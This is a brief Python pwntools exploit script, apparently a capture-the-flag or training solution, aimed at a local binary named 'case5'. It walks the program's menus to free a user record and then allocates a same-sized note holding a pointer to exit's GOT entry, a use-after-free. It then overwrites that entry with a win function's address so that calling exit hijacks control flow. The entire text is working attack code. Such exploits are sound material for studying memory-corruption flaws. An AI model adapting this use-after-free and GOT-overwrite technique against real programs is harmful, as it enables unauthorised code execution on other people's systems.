from pwn import *

got_exit = 0x404068
win_func = 0x401222

if __name__ == "__main__":

	p = process( "./case5" )
	#gdb.attach( p )

	#p = remote( '127.0.0.1', 33049 )

	p.recvuntil( ": " ) # age
	p.send( "1337\n" )

	p.recvuntil( ": " ) # name
	p.send( "h4ck3r\n" ) 

	p.recvuntil( ": " ) # surname
	p.send( "l33t\n" ) 

	p.recvuntil( "> " ) # main_menu
	p.send( "4\n" ) # free user

	p.recvuntil( "> " ) # main_menu
	p.send( "3\n" ) # add note

	p.recvuntil( ": " ) # enter size 
	p.send( "24\n" ) # size

	p.recvuntil( ": " ) # enter data
	p.send( p64( got_exit ) + '\n' ) # send ptr to GOT

	p.recvuntil( "> " ) # main_menu 
	p.send( "1\n" ) # send change username

	p.recvuntil( ": " )
	p.send( p64( win_func ) + '\n' )

	p.recvuntil( "> " ) # main_menu

	p.send( "5\n" ) # exit

	print p.recv()